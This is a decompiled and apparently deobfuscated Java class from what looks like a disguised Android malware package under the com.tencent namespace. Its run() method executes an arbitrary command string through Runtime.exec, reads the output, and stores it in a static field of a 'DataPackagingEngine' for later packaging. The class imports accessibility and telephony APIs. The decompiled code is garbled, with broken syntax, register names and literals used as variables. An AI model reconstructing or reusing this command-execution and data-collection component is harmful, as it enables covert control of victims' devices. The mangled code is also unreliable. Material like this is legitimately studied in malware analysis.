package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: DataPackagingEngine_1
 * Original: Lcom/tencent/tunesxconcerningn103$1;
 */
class DataPackagingEngine_1 implements Runnable; {

    // === FIELDS ===
    final String val$c;

    // === METHODS ===

     void Constructor(String param0) {
        v0.val$c = v1;
        // new Object()
        return;
    }

    public void run() {
        v0 = "";
        v1 = new StringBuffer();
        // new StringBuffer()
        v3 = Runtime.getRuntime();
        v3 = v6.val$c;
        v3 = v2.exec(v3);
        v3 = Build$VERSION.SDK_INT;
        v4 = 26;
        if (v3 < 26) { // goto +16
        v3 = TimeUnit.SECONDS;
        v4 = 60;
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(v2, 60, v5, v3);
        if (v3 != null && v3 != 0) { // goto +9
        v2.destroy();
        // goto (branch)
        v2.waitFor();
        v3 = new BufferedReader();
        v2.getInputStream();
        // new InputStreamReader(v5)
        // new BufferedReader(60)
        v3.readLine();
        if (60 == null || 60 == 0) { // goto +6
        v1.append(60);
        // goto (branch)
        v2.getInputStream();
        60.close();
        v2.getOutputStream();
        v2.close();
        v3.close();
        // goto (branch)
        DataPackagingEngine.dt = "";
        v1.toString();
        v1 = v1.length();
        if (v2 != null && v2 != 0) { // goto +4
        DataPackagingEngine.dt = "";
        DataPackagingEngine.dt = v1;
        return;
    }
}
